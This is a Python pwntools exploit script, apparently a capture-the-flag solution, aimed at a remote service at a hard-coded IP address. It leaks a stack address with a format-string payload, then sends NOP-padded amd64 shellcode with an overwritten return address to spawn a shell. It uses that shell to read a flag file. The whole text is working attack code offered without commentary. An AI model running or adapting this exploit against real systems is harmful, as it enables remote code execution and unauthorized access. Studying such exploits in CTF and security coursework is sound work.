#!/usr/bin/env python3

import sys
from pwn import *

#old_rbp = 0x7fffffffdfb0
#rsp = 0x7fffffffde90
context.arch = 'amd64'

def pad(s):
        return s + (b"\x90" * (256 + 8 - len(s)))

p = remote('140.113.207.240',8836)

old_rbp = "%38$p"
p.recvuntil('payload <3\n')
p.sendline(old_rbp)
old_rbp = p.recvuntil('Wanna').decode('unicode_escape').replace('Wanna','')

p.recvuntil('payload <3\n')
exploit = asm(shellcraft.amd64.linux.sh())
exploit = pad(exploit)
exploit += p64(int(old_rbp, base=16) - 288)
exploit += b"\x0a"
p.sendline(exploit)
p.recv()
p.sendline('/bin/cat flag')
print(p.recv())
#p.interactive()
p.close()
